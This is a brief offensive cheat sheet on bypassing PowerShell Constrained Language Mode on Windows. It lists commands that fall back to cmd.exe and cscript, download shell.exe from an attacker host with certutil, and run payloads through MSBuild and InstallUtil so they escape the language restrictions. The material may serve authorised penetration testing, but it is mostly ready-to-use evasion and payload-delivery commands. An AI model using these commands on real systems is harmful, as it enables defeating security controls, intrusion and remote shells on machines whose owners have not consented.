# Constrained Language Mode (CLM) Bypass

## Check Current Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = Add-Type, COM objects, Reflection blocked
```

## Bypass Techniques
```powershell
# 1. Use native executables instead
cmd.exe /c whoami
cscript.exe bypass.vbs

# 2. Use certutil to download files
certutil -urlcache -split -f http://$ATTACK_IP/shell.exe shell.exe

# 3. MSBuild (runs in Full Language mode)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.xml

# 4. InstallUtil
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe

# 5. Pre-compile .NET executables (Add-Type blocked but pre-compiled runs fine)
# 6. Use cmd.exe for all non-PowerShell tasks
```
